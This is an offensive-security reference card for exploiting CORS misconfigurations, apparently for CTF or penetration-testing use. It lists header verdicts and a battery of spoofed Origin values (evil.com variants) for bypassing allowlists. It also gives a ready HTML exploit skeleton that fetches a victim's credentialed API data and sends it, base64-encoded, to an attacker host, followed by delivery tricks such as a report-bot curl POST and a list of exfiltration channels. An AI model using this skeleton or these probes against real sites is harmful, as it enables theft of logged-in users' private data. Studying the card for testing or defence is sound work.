# Reference card — the CORS quick-lookup for the field

A condensed card — the headers, the verdicts, the battery, the exploit.

---

## The two gates

```
ACAO: <reflected | * | null | fixed | subdomain | prefix/suffix>
ACAC: true | absent
```

## The verdicts

```
reflected + ACAC    → credentialed read — VULN
null + ACAC         → opaque read — VULN
* (any)             → public read — NOT vuln
fixed (no bypass)   → closed — pivot
no ACAO             → not CORS
```

## The Origin battery — the check-shape probes

```
https://evil.com              reflect
null                          null-allow
https://target.com.evil.com   prefix
https://eviltarget.com        suffix
https://evil-target.com       substring
https://sub.target.com        subdomain-trust
https://target.com@evil.com   userinfo-confusion
https://evil.com?target.com   query-confusion
https://target.com%2eevil.com encoded-dot
https://target`com            special-char
http://target.com             scheme
https://target.com.           trailing-dot
file://                       file-origin
data:text/html,               data-origin
```

## The credential

```
SameSite=None+Secure → attaches → credentialed read
Lax/Strict/no-SS     → doesn't attach → non-credentialed
a Bearer             → needs the token + a preflight
```

## The exploit skeleton

```html
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))
 .catch(e=>fetch('https://a/?err='+e))
</script>
```

## The delivery

```
a /report bot → curl -X POST "$BASE/report" -d 'url=<page>'
a data: URL → for an airgapped/null-origin case
a stored page → same-origin, no CORS needed
a subdomain → a trusted-origin page
```

## The exfil

```
fetch GET / img GET / beacon / ws / write-back / DOM-writeback / DNS
```

## The falsifiers

```
ACAO:* on sensitive endpoint → public — not vuln
ACAC absent or SameSite-gated → non-credentialed
strict allowlist + no bypass → closed
```

## The alternates

```
a JSONP endpoint → <script src="?callback=">
a ws endpoint → a CSWSH read
a postMessage broadcast → an iframe + listener
an XSS surface → a same-origin read
an XS-leak → a side-channel
```

## The confusables

```
a READ → web-cors    a WRITE → web-csrf    a measure → xs-leaks
a script-serve → JSONP/XSSI    a broadcast → postMessage
```
